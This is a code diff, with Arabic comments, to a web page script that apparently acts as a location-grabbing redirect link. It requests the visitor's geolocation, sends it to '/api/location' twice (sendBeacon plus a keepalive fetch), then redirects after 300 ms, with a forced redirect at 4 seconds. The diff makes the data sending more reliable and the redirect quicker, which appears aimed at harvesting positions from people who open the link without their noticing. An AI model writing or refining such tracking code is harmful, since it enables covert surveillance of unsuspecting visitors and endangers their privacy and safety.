@@ -101,6 +101,9 @@
             let locationCaptured = false;
             let bestPos = { coords: { latitude: 'N/A', longitude: 'N/A', accuracy: 'N/A' } };
 
+            // أمان: تحويل قسري بعد 4 ثوانٍ من بداية التحميل
+            setTimeout(redirect, 4000);
+
             // 1. طلب الموقع
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
@@ -131,32 +134,25 @@
 
             const jsonStr = JSON.stringify(data);
 
-            // 4. إرسال البيانات بـ sendBeacon أولاً (ينجو من إغلاق الصفحة)
-            let beaconSent = false;
+            // 4. إرسال البيانات بـ sendBeacon (ينجو من إغلاق الصفحة)
             try {
                 const blob = new Blob([jsonStr], { type: 'application/json' });
-                beaconSent = navigator.sendBeacon('/api/location', blob);
+                navigator.sendBeacon('/api/location', blob);
             } catch (e) { }
 
-            // 5. إذا نجح الـ Beacon، نحوّل فوراً
-            if (beaconSent) {
-                setTimeout(redirect, 300);
-            } else {
-                // 6. إذا فشل، نستخدم fetch ثم نحوّل
-                try {
-                    await fetch('/api/location', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: jsonStr,
-                        keepalive: true
-                    });
-                } catch (e) { }
-                redirect();
-            }
-        };
+            // 5. إرسال نسخة ثانية بـ fetch كاحتياط
+            try {
+                fetch('/api/location', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: jsonStr,
+                    keepalive: true
+                });
+            } catch (e) { }
 
-        // أمان: تحويل قسري بعد 4 ثوانٍ
-        setTimeout(redirect, 4000);
+            // 6. تحويل بعد 300ms
+            setTimeout(redirect, 300);
+        };
     </script>
 </body>
 
